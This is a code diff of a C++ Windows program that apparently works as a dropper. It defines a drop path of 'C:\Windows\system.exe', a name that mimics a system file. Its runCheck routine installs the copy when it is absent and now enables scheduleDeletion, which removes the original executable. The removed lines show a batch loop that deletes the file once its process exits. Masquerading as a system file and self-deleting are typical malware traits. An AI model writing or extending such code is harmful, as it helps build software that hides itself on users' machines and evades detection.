@@ -10,15 +10,18 @@
 #include <windows.h>
 #include <vector>
 #include <sstream>
+#include <iostream>
 #include "lib.h"
+#include "resources.h"
+
+const char* EXEC_DROP_PATH = "C:\\Windows\\system.exe";
 
 char* GetDefaultModuleFileName(void) {
-	char* szModuleFileName = (char*)malloc(sizeof(char) * MAX_PATH);
+	char* szModuleFileName = (char*)malloc(MAX_PATH);
 	GetModuleFileNameA(NULL, szModuleFileName, MAX_PATH);
 	return szModuleFileName;
 }
 
-const char* EXEC_DROP_PATH = "C:\\Windows\\system.exe";
 LPSTR moduleFileName = GetDefaultModuleFileName();
 
 bool execInstalled(void) {
@@ -55,33 +58,25 @@ void install(void) {
 }
 
 void scheduleDeletion(void) {
-	std::vector<char*> fileNameSplit = split(moduleFileName, '\\');
-	const char* executable = fileNameSplit.back();
+	std::vector<std::string> fileNameSplit = split(moduleFileName, '\\');
+	std::string lastSegment = fileNameSplit.back();
+	const char* executable = lastSegment.c_str();
 
-	std::stringstream ss_parameters;
-	ss_parameters 	<< ":LoopStart ^\n" <<
-					"IF tasklist /FI \"IMAGENAME equ " << executable << "\" GOTO :LoopStart ^ \n"
-					"del" << " " << "\"" << moduleFileName << "\"";
+	// std::cout << (char*)scrpt_remove.data;
 
-	std::string str = ss_parameters.str();
-	const char* parameters = str.c_str();
-
-	printf("%s\n", parameters);
-	system(parameters);
-
-	// // ShellExecuteA(NULL,
-	// // 	NULL,
-	// // 	"del",
-	// // 	parameters,
-	// // 	NULL,
-	// // 	0
-	// // );
+	// ShellExecuteA(NULL,
+	// 	NULL,
+	// 	"del",
+	// 	parameters,
+	// 	NULL,
+	// 	0
+	// );
 }
 
 void runCheck(void) {
 	if (!execInstalled()) {
 		install();
-		// scheduleDeletion();
+		scheduleDeletion();
 	}
 }
 
